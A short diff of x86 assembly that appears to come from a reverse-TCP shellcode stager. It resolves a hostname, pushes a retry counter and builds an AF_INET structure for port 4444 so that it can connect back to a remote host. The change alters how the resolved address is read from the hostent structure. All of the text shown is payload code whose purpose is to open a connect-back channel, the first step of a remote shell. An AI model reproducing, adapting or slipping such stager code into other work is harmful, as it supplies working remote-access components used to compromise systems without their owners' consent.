@@ -43,8 +43,7 @@ got_hostname:
   call ebp               ; gethostbyname( "name" );
 
 set_address:
-  mov eax, [eax+12]      ; names
-  mov eax, [eax+8]       ; address[0]
+  mov eax, [eax+28]      ; names
   push byte 0x05         ; retry counter
   push eax               ; host address
   push 0x5C110002        ; family AF_INET and port 4444
